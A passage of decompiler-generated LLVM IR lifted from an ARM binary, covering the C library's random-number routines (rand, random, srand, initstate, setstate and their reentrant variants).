bb27:                                             ; preds = %dec_label_pc_15438
  %v2_15448 = load i32, i32* %ip.global-to-local, align 4
  %v3_15448 = inttoptr i32 %v2_15448 to i32*
  store i32 4, i32* %v3_15448, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15438, %bb27
  call void @__pseudo_cond_branch(i1 %v7_1543c, i32 ptrtoint (i32* @global_var_11c94.1170 to i32))
  br label %dec_label_pc_15450

dec_label_pc_15450:                               ; preds = %dec_label_pc_15450, %.thread3
  %v0_15450 = call i32 @abort()
  br label %dec_label_pc_15450

; uselistorder directives
  uselistorder i32 %v1_15400, { 2, 1, 0 }
  uselistorder i32 %v1_1534c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 8, 3, 0, 1, 4, 5, 7, 6, 2 }
  uselistorder i32* @global_var_33838.1168, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15438, { 1, 0 }
  uselistorder label %dec_label_pc_153f0, { 1, 0 }
  uselistorder label %dec_label_pc_153b8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1533c, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_15468 = call i32 @random()
  ret i32 %v0_15468

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 5, 9, 8, 10, 11, 4, 7, 12, 3, 6, 0, 2, 1 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1546c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2d4f0.1172 to i32), i32* @r4, align 4
  %v2_15474 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_15474, i32* @r0, align 4
  %v1_1548c = call i32 @__pthread_return_void()
  %v1_1549c = call i32 @__pthread_return_0()
  %v2_154a0 = ptrtoint i32* %stack_var_-16 to i32
  %v3_154a8 = call i32 @__GI_random_r(i32* inttoptr (i32 185608 to i32*), i32 %v2_154a0)
  store i32 %v2_15474, i32* @r0, align 4
  store i32 87232, i32* @lr, align 4
  %v1_154bc = call i32 @__pthread_return_void()
  %v3_154c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_1546c, i32* @r4, align 4
  ret i32 %v3_154c0
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_154ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_154ec, i32* @r0, align 4
  %v1_15508 = call i32 @__pthread_return_void()
  %v1_15518 = call i32 @__pthread_return_0()
  %v3_15528 = load i32, i32* bitcast (i32** @global_var_2d510.1185 to i32*), align 4
  store i32 %v3_15528, i32* @r4, align 4
  %v3_1552c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_2d508)
  %v1_15534 = icmp slt i32 %v3_1552c, 0
  store i32 %v2_154ec, i32* @r0, align 4
  %. = select i1 %v1_15534, i32 0, i32 ptrtoint (i32** @global_var_2d50c.1187 to i32)
  %v1_1554c = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1557c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_1557c, i32* @r0, align 4
  %v1_155a0 = call i32 @__pthread_return_void()
  %v1_155b0 = call i32 @__pthread_return_0()
  %v0_155b8 = load i32, i32* @r5, align 4
  %v0_155bc = load i32, i32* @r6, align 4
  %v0_155c0 = load i32, i32* @r8, align 4
  store i32 %v0_155c0, i32* @r0, align 4
  %v3_155c4 = load i32, i32* bitcast (i32** @global_var_2d510.1185 to i32*), align 4
  store i32 %v3_155c4, i32* @r4, align 4
  %v4_155c8 = inttoptr i32 %v0_155c0 to i32*
  %v5_155c8 = call i32 @__GI_initstate_r(i32* %v4_155c8, i32 %v0_155b8, i32 %v0_155bc, i32 ptrtoint (i32* @global_var_2d508 to i32))
  store i32 %v2_1557c, i32* @r0, align 4
  %v1_155dc = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_2d50c.1187 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_1560c = load i32, i32* @r4, align 4
  %v9_1560c = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2d4f0.1172 to i32), i32* @r4, align 4
  %v2_15614 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_15614, i32* @r0, align 4
  %v1_15630 = call i32 @__pthread_return_void()
  %v1_15640 = call i32 @__pthread_return_0()
  %v0_15644 = load i32, i32* @r6, align 4
  store i32 %v0_15644, i32* @r0, align 4
  %v2_1564c = inttoptr i32 %v0_15644 to i32*
  %v3_1564c = call i32 @srandom_r(i32* %v2_1564c, i32 ptrtoint (i32* @global_var_2d508 to i32))
  store i32 %v2_15614, i32* @r0, align 4
  store i32 87656, i32* @lr, align 4
  %v1_15664 = call i32 @__pthread_return_void()
  store i32 %v3_1560c, i32* @r4, align 4
  store i32 %v9_1560c, i32* @r6, align 4
  ret i32 %v1_15664

; uselistorder directives
  uselistorder i32* @global_var_2d508, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2d508 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_15688 = add i32 %tmp, 12
  %v2_15688 = inttoptr i32 %v1_15688 to i32*
  %v3_15688 = load i32, i32* %v2_15688, align 4
  %v3_1568c = load i32, i32* @r4, align 4
  store i32 %v3_1568c, i32* %stack_var_-20, align 4
  %v2_15690 = icmp eq i32 %v3_15688, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_15690, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_1569c1 = add i32 %tmp, 8
  %v2_1569c2 = inttoptr i32 %v1_1569c1 to i32*
  %v3_1569c3 = load i32, i32* %v2_1569c2, align 4
  store i32 %v3_1569c3, i32* %r1.global-to-local, align 4
  %v3_156b0 = add i32 %v3_1569c3, -4
  %v4_156b0 = inttoptr i32 %v3_156b0 to i32*
  store i32 0, i32* %v4_156b0, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_15698 = add i32 %tmp, 4
  %v3_15698 = inttoptr i32 %v2_15698 to i32*
  %v4_15698 = load i32, i32* %v3_15698, align 4
  %v1_1569c = add i32 %tmp, 8
  %v2_1569c = inttoptr i32 %v1_1569c to i32*
  %v3_1569c = load i32, i32* %v2_1569c, align 4
  store i32 %v3_1569c, i32* %r1.global-to-local, align 4
  %v3_156a0 = sub i32 %v4_15698, %v3_1569c
  %v4_156a4 = sdiv i32 %v3_156a0, 4
  %v4_156ac = mul i32 %v4_156a4, 5
  %v5_156ac = add i32 %v4_156ac, %v3_15688
  %v3_156b4 = add i32 %v3_1569c, -4
  %v4_156b4 = inttoptr i32 %v3_156b4 to i32*
  store i32 %v5_156ac, i32* %v4_156b4, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_156b8 = add i32 %arg1, 4
  store i32 %v1_156b8, i32* %r6.global-to-local, align 4
  %v2_156bc = inttoptr i32 %arg1 to i32*
  %v3_156bc = load i32, i32* %v2_156bc, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_156c4 = srem i32 %v3_156bc, 5
  store i32 %v2_156c4, i32* %r0.global-to-local, align 4
  %v2_156d0 = and i32 %v2_156c4, 1073741824
  %v3_156d0 = icmp ne i32 %v2_156d0, 0
  %v4_156d0 = mul nsw i32 %v2_156c4, 4
  %v2_156d4 = icmp ne i32 %v2_156c4, 4
  %v3_156d4 = and i1 %v3_156d0, %v2_156d4
  br i1 %v3_156d4, label %dec_label_pc_15730, label %dec_label_pc_156d8

dec_label_pc_156d8:                               ; preds = %bb
  %v5_156d0 = add i32 %v4_156d0, ptrtoint (i32* @global_var_24af4.1201 to i32)
  %v1_156d8 = add i32 %v4_156d0, add (i32 ptrtoint (i32* @global_var_24af4.1201 to i32), i32 20)
  %v2_156d8 = inttoptr i32 %v1_156d8 to i32*
  %v3_156d8 = load i32, i32* %v2_156d8, align 4
  store i32 %v3_156d8, i32* %r5.global-to-local, align 4
  %v6_156dc = inttoptr i32 %v5_156d0 to i32*
  %v7_156dc = load i32, i32* %v6_156dc, align 4
  store i32 %v7_156dc, i32* %r7.global-to-local, align 4
  %v2_156e0 = icmp eq i32 %v2_156c4, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_156e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_156e8 = add i32 %v1_156e8, 16
  %v3_156e8 = inttoptr i32 %v2_156e8 to i32*
  store i32 %v3_156d8, i32* %v3_156e8, align 4
  %v0_156ec = load i32, i32* %r7.global-to-local, align 4
  %v1_156ec = load i32, i32* %r4.global-to-local, align 4
  %v2_156ec = add i32 %v1_156ec, 20
  %v3_156ec = inttoptr i32 %v2_156ec to i32*
  store i32 %v0_156ec, i32* %v3_156ec, align 4
  %v0_156f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_156f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_156f0 = add i32 %v1_156f0, 12
  %v3_156f0 = inttoptr i32 %v2_156f0 to i32*
  store i32 %v0_156f0, i32* %v3_156f0, align 4
  br i1 %v2_156e0, label %dec_label_pc_1571c, label %dec_label_pc_156f8

dec_label_pc_156f8:                               ; preds = %dec_label_pc_156d8
  %v0_156f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_156f8 = add i32 %v0_156f8, -4
  %v2_156f8 = inttoptr i32 %v1_156f8 to i32*
  %v3_156f8 = load i32, i32* %v2_156f8, align 4
  %v1_156fc = load i32, i32* %r1.global-to-local, align 4
  %v2_156fc = sdiv i32 %v3_156f8, %v1_156fc
  store i32 %v2_156fc, i32* %r0.global-to-local, align 4
  %v4_15700 = mul i32 %v2_156fc, 4
  %v5_15700 = add i32 %v4_15700, %v0_156f8
  %v1_15704 = load i32, i32* %r4.global-to-local, align 4
  %v2_15704 = add i32 %v1_15704, 4
  %v3_15704 = inttoptr i32 %v2_15704 to i32*
  store i32 %v5_15700, i32* %v3_15704, align 4
  %v0_15708 = load i32, i32* %r0.global-to-local, align 4
  %v1_15708 = load i32, i32* %r7.global-to-local, align 4
  %v2_15708 = add i32 %v1_15708, %v0_15708
  %v0_1570c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1570c, i32* %r1.global-to-local, align 4
  %v2_15710 = srem i32 %v2_15708, %v0_1570c
  %v0_15714 = load i32, i32* %r6.global-to-local, align 4
  %v4_15714 = mul i32 %v2_15710, 4
  %v5_15714 = add i32 %v0_15714, %v4_15714
  store i32 %v5_15714, i32* %r0.global-to-local, align 4
  %v1_15718 = load i32, i32* %r4.global-to-local, align 4
  %v2_15718 = inttoptr i32 %v1_15718 to i32*
  store i32 %v5_15714, i32* %v2_15718, align 4
  br label %dec_label_pc_1571c

dec_label_pc_1571c:                               ; preds = %dec_label_pc_156d8, %dec_label_pc_156f8
  %v0_1571c = load i32, i32* %r6.global-to-local, align 4
  %v1_1571c = load i32, i32* %r5.global-to-local, align 4
  %v4_1571c = mul i32 %v1_1571c, 4
  %v5_1571c = add i32 %v4_1571c, %v0_1571c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_15724 = load i32, i32* %r4.global-to-local, align 4
  %v2_15724 = add i32 %v1_15724, 24
  %v3_15724 = inttoptr i32 %v2_15724 to i32*
  store i32 %v5_1571c, i32* %v3_15724, align 4
  %v0_15728 = load i32, i32* %r6.global-to-local, align 4
  %v1_15728 = load i32, i32* %r4.global-to-local, align 4
  %v2_15728 = add i32 %v1_15728, 8
  %v3_15728 = inttoptr i32 %v2_15728 to i32*
  store i32 %v0_15728, i32* %v3_15728, align 4
  %v2_1572c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1572c, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_15730:                               ; preds = %bb
  %v0_15730 = call i32 @__errno_location()
  %v2_15738 = inttoptr i32 %v0_15730 to i32*
  store i32 22, i32* %v2_15738, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15740 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15740, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_156c4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 3, 4, 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1571c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_15748 = add i32 %tmp, 12
  %v2_15748 = inttoptr i32 %v1_15748 to i32*
  %v3_15748 = load i32, i32* %v2_15748, align 4
  store i32 %v3_15748, i32* %r3.global-to-local, align 4
  %v2_1574c = icmp eq i32 %v3_15748, 0
  %v3_15750 = load i32, i32* @r4, align 4
  store i32 %v3_15750, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1575c = add i32 %tmp, 8
  %v2_1575c = inttoptr i32 %v1_1575c to i32*
  %v3_1575c = load i32, i32* %v2_1575c, align 4
  store i32 %v3_1575c, i32* %lr.global-to-local, align 4
  br i1 %v2_1574c, label %dec_label_pc_15764, label %dec_label_pc_15788

dec_label_pc_15764:                               ; preds = %entry
  %v1_15764 = inttoptr i32 %v3_1575c to i32*
  %v2_15764 = load i32, i32* %v1_15764, align 4
  store i32 %v2_15764, i32* %r2.global-to-local, align 4
  %v2_1576c = mul i32 %v2_15764, 1103515245
  %v1_15774 = add i32 %v2_1576c, 12345
  %tmp10 = bitcast i32 %v1_15774 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_15778 = bitcast float %tmp11 to i32
  store i32 %v1_15778, i32* %r3.global-to-local, align 4
  store i32 %v1_15778, i32* %v1_15764, align 4
  %v0_15780 = load i32, i32* %r3.global-to-local, align 4
  %v2_15780 = inttoptr i32 %arg2 to i32*
  store i32 %v0_15780, i32* %v2_15780, align 4
  br label %dec_label_pc_157cc

dec_label_pc_15788:                               ; preds = %entry
  %v2_15788 = load i32, i32* %arg1, align 4
  store i32 %v2_15788, i32* %r2.global-to-local, align 4
  %v1_1578c = add i32 %tmp, 4
  %v2_1578c = inttoptr i32 %v1_1578c to i32*
  %v3_1578c = load i32, i32* %v2_1578c, align 4
  store i32 %v3_1578c, i32* %r0.global-to-local, align 4
  %v1_15790 = inttoptr i32 %v2_15788 to i32*
  %v2_15790 = load i32, i32* %v1_15790, align 4
  store i32 %v2_15790, i32* %r3.global-to-local, align 4
  %v1_15794 = inttoptr i32 %v3_1578c to i32*
  %v2_15794 = load i32, i32* %v1_15794, align 4
  %v4_15794 = add i32 %v3_1578c, 4
  store i32 %v4_15794, i32* %r0.global-to-local, align 4
  %v2_15798 = add i32 %v2_15794, %v2_15790
  store i32 %v2_15798, i32* %r3.global-to-local, align 4
  store i32 %v2_15798, i32* %v1_15790, align 4
  %v3_1579c = load i32, i32* %r2.global-to-local, align 4
  %v4_1579c = add i32 %v3_1579c, 4
  store i32 %v4_1579c, i32* %r2.global-to-local, align 4
  %v0_157a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_157a0 = add i32 %v0_157a0, 24
  %v2_157a0 = inttoptr i32 %v1_157a0 to i32*
  %v3_157a0 = load i32, i32* %v2_157a0, align 4
  store i32 %v3_157a0, i32* %r4.global-to-local, align 4
  %v0_157a4 = load i32, i32* %r3.global-to-local, align 4
  %v3_157a4 = udiv i32 %v0_157a4, 2
  store i32 %v3_157a4, i32* %r3.global-to-local, align 4
  %v3_157a8 = icmp ult i32 %v4_1579c, %v3_157a0
  %v1_157ac = load i32, i32* %r5.global-to-local, align 4
  %v2_157ac = inttoptr i32 %v1_157ac to i32*
  store i32 %v3_157a4, i32* %v2_157ac, align 4
  br i1 %v3_157a8, label %dec_label_pc_157bc, label %bb

bb:                                               ; preds = %dec_label_pc_15788
  %v1_157b0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_157b0, i32* %r2.global-to-local, align 4
  %v0_157b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_157b4, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_157bc:                               ; preds = %dec_label_pc_15788
  %v0_157b41 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_157b41, i32* %r3.global-to-local, align 4
  %v1_157bc = load i32, i32* %r4.global-to-local, align 4
  %v3_157bc = icmp ult i32 %v0_157b41, %v1_157bc
  br i1 %v3_157bc, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_157bc
  store i32 %v0_157b41, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_157bc
  %v1_157c4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_157c4, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_157c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_157c8 = inttoptr i32 %v0_157c8 to i32*
  %v2_157c8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_157c8, i32* %v1_157c8, align 4
  %v3_157c8 = add i32 %v0_157c8, 4
  %v4_157c8 = inttoptr i32 %v3_157c8 to i32*
  %v5_157c8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_157c8, i32* %v4_157c8, align 4
  br label %dec_label_pc_157cc

dec_label_pc_157cc:                               ; preds = %dec_label_pc_15764, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_157d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_157d0, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_157b41, { 1, 0, 2 }
  uselistorder i32 %v3_157a4, { 1, 0 }
  uselistorder i32 %v1_15778, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_157cc, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_157d8 = load i32, i32* @r4, align 4
  store i32 %v3_157d8, i32* %stack_var_-32, align 4
  %v6_157d8 = load i32, i32* @r5, align 4
  %v1_157dc = add i32 %tmp, 12
  %v2_157dc = inttoptr i32 %v1_157dc to i32*
  %v3_157dc = load i32, i32* %v2_157dc, align 4
  %v2_157e4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_157dc, 4
  br i1 %tmp29, label %.dec_label_pc_15890_crit_edge, label %dec_label_pc_157f4

.dec_label_pc_15890_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_15890

dec_label_pc_157f4:                               ; preds = %entry
  %v0_157f4 = load i32, i32* @r0, align 4
  %v2_157f4 = icmp eq i32 %v0_157f4, 0
  %v1_157f8 = add i32 %tmp, 8
  %v2_157f8 = inttoptr i32 %v1_157f8 to i32*
  %v3_157f8 = load i32, i32* %v2_157f8, align 4
  store i32 %v3_157f8, i32* %r7.global-to-local, align 4
  br i1 %v2_157f4, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_157f4
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_157f4, %bb
  %v0_15804 = phi i32 [ %v0_157f4, %dec_label_pc_157f4 ], [ 1, %bb ]
  %v2_15800 = icmp eq i32 %v3_157dc, 0
  %v2_15804 = inttoptr i32 %v3_157f8 to i32*
  store i32 %v0_15804, i32* %v2_15804, align 4
  br i1 %v2_15800, label %dec_label_pc_1588c, label %dec_label_pc_1580c

dec_label_pc_1580c:                               ; preds = %bb21
  %v1_1580c = add i32 %tmp, 16
  %v2_1580c = inttoptr i32 %v1_1580c to i32*
  %v3_1580c = load i32, i32* %v2_1580c, align 4
  store i32 %v3_1580c, i32* %sb.global-to-local, align 4
  %v0_15810 = load i32, i32* @r0, align 4
  %v0_15814 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15814, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_1585c23 = icmp sgt i32 %v3_1580c, 1
  br i1 %v5_1585c23, label %dec_label_pc_15820, label %dec_label_pc_15860

dec_label_pc_15820:                               ; preds = %dec_label_pc_1580c, %dec_label_pc_15820
  %v0_1583025 = phi i32 [ %v0_15850.pre, %dec_label_pc_15820 ], [ %v0_15810, %dec_label_pc_1580c ]
  %v1_1584824 = phi i32 [ %v5_15848, %dec_label_pc_15820 ], [ %v0_15814, %dec_label_pc_1580c ]
  %v2_15820 = srem i32 %v0_1583025, ptrtoint ([54 x i8]* @global_var_1f31d.1205 to i32)
  %v2_1582c = mul i32 %v2_15820, 16807
  %v2_15834 = sdiv i32 %v0_1583025, ptrtoint ([54 x i8]* @global_var_1f31d.1205 to i32)
  %tmp30 = mul i32 %v2_15834, -2836
  %v2_15840 = add i32 %v2_1582c, %tmp30
  %v8_15840 = icmp slt i32 %v2_15840, 0
  %v2_15844 = add i32 %v2_15840, 2147483647
  %v2_15844.v2_15840 = select i1 %v8_15840, i32 %v2_15844, i32 %v2_15840
  store i32 %v2_15844.v2_15840, i32* @r5, align 4
  %v2_15848 = add i32 %v1_1584824, 4
  %v3_15848 = inttoptr i32 %v2_15848 to i32*
  store i32 %v2_15844.v2_15840, i32* %v3_15848, align 4
  %v4_15848 = load i32, i32* %sl.global-to-local, align 4
  %v5_15848 = add i32 %v4_15848, 4
  store i32 %v5_15848, i32* %sl.global-to-local, align 4
  %v0_1584c.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1584c.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_15850.pre = load i32, i32* @r5, align 4
  %v1_15858 = add i32 %v0_1584c.pre, 1
  store i32 %v1_15858, i32* %r8.global-to-local, align 4
  %v5_1585c = icmp slt i32 %v0_1584c.pre, %v1_1584c.pre
  br i1 %v5_1585c, label %dec_label_pc_15820, label %dec_label_pc_1584c.dec_label_pc_15860_crit_edge

dec_label_pc_1584c.dec_label_pc_15860_crit_edge:  ; preds = %dec_label_pc_15820
  %v0_1586c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15860

dec_label_pc_15860:                               ; preds = %dec_label_pc_1584c.dec_label_pc_15860_crit_edge, %dec_label_pc_1580c
  %v0_1586c = phi i32 [ %v0_1586c.pre, %dec_label_pc_1584c.dec_label_pc_15860_crit_edge ], [ %v0_15814, %dec_label_pc_1580c ]
  %v0_15864.lcssa = phi i32 [ %v1_1584c.pre, %dec_label_pc_1584c.dec_label_pc_15860_crit_edge ], [ %v3_1580c, %dec_label_pc_1580c ]
  %v2_15864 = mul i32 %v0_15864.lcssa, 10
  store i32 %v2_15864, i32* @r4, align 4
  %v0_15868 = load i32, i32* %r6.global-to-local, align 4
  %v1_15868 = add i32 %v0_15868, 20
  %v2_15868 = inttoptr i32 %v1_15868 to i32*
  %v3_15868 = load i32, i32* %v2_15868, align 4
  %v4_1586c = mul i32 %v3_15868, 4
  %v5_1586c = add i32 %v0_1586c, %v4_1586c
  %v1_15870 = inttoptr i32 %v0_15868 to i32*
  store i32 %v5_1586c, i32* %v1_15870, align 4
  %v3_15870 = add i32 %v0_15868, 4
  %v4_15870 = inttoptr i32 %v3_15870 to i32*
  %v5_15870 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_15870, i32* %v4_15870, align 4
  br label %dec_label_pc_1587c

dec_label_pc_15878:                               ; preds = %dec_label_pc_1587c
  %v0_15880 = load i32, i32* %r6.global-to-local, align 4
  %v2_15878 = inttoptr i32 %v0_15880 to i32*
  %v3_15878 = call i32 @__GI_random_r(i32* %v2_15878, i32 %v2_157e4)
  br label %dec_label_pc_1587c

dec_label_pc_1587c:                               ; preds = %dec_label_pc_15860, %dec_label_pc_15878
  %v0_1587c = load i32, i32* @r4, align 4
  %v1_1587c = add i32 %v0_1587c, -1
  store i32 %v1_1587c, i32* @r4, align 4
  %v6_1587c = icmp slt i32 %v1_1587c, 0
  br i1 %v6_1587c, label %dec_label_pc_1588c, label %dec_label_pc_15878

dec_label_pc_1588c:                               ; preds = %dec_label_pc_1587c, %bb21
  %v2_15894.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_15890

dec_label_pc_15890:                               ; preds = %.dec_label_pc_15890_crit_edge, %dec_label_pc_1588c
  %v2_15894 = phi i32 [ %v3_157d8, %.dec_label_pc_15890_crit_edge ], [ %v2_15894.pre, %dec_label_pc_1588c ]
  %v26_15894 = phi i32 [ -1, %.dec_label_pc_15890_crit_edge ], [ 0, %dec_label_pc_1588c ]
  store i32 %v2_15894, i32* @r4, align 4
  store i32 %v6_157d8, i32* @r5, align 4
  ret i32 %v26_15894

; uselistorder directives
  uselistorder i32 %v1_1587c, { 1, 0 }
  uselistorder i32 %v0_15868, { 1, 0, 2 }
  uselistorder i32 %v0_1584c.pre, { 1, 0 }
  uselistorder i32 %v5_15848, { 1, 0 }
  uselistorder i32 %v2_15840, { 2, 1, 0 }
  uselistorder i32 %v0_1583025, { 1, 0 }
  uselistorder i32 %v0_15814, { 1, 0, 2 }
  uselistorder i32 %v3_1580c, { 1, 0, 2 }
  uselistorder i32 %v3_157dc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([54 x i8]* @global_var_1f31d.1205 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_15890, { 1, 0 }
  uselistorder label %dec_label_pc_1587c, { 1, 0 }
  uselistorder label %dec_label_pc_15820, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15898:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_15898 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15898, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_15898
  %v2_15898 = load i32, i32* @r7, align 4
  %v5_15898 = udiv i32 %v2_15898, 8
  %v6_15898 = and i32 %v5_15898, %arg1
  store i32 %v6_15898, i32* %r4.global-to-local, align 4
  %v2_1589c = load i32, i32* @sp, align 4
  %v8_1589c = shl i32 %v2_1589c, %arg3
  %v9_1589c = and i32 %v8_1589c, %arg2
  call void @__pseudo_branch(i32 %v9_1589c)
  %v0_158a0.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_158a0 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_158a0.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_158a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_158a0 = load i32, i32* @fp, align 4
  %v8_158a0 = shl i32 %v2_158a0, %v3_158a0
  %v9_158a0 = and i32 %v8_158a0, %v1_158a0
  store i32 %v9_158a0, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_15898, %bb
  %v10_158a0 = phi i32 [ %arg1, %dec_label_pc_15898 ], [ %v9_158a0, %bb ], [ %v1_158a0, %.thread ]
  ret i32 %v10_158a0

; uselistorder directives
  uselistorder i32 %v1_158a0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
